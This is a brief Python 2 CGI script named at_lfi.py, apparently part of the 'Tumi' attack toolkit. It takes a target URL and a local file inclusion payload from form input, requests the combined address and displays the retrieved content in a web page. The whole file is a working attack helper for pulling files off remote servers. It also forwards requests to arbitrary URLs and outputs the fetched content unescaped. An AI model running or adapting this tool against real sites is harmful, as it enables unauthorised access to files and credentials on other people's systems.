#!/usr/bin/python 

#Tumi (c) 2013 at_lfi.py
 
import httplib2 
import urllib2 
import re 
import cgi
import cgitb
cgitb.enable()

# GET
form   = cgi.FieldStorage()
url = form.getvalue("url")
localfile = form.getvalue("payload")

# HTML HEADERS
print "Content-Type: text/html; charset=UTF-8"	# Print headers
print ""

# HTML 

print '''
<html>
<body>
'''

if 'http://' not in url:  
    url = 'http://' + url 
lfi = url+localfile

req = urllib2.urlopen(lfi) 
rpta = req.read()

print "<textarea style=\"margin: 2px; height: 189px; width: 392px; color: white; background-color: transparent; \">" + rpta + "</textarea>"

'''
</body>
</html>
'''
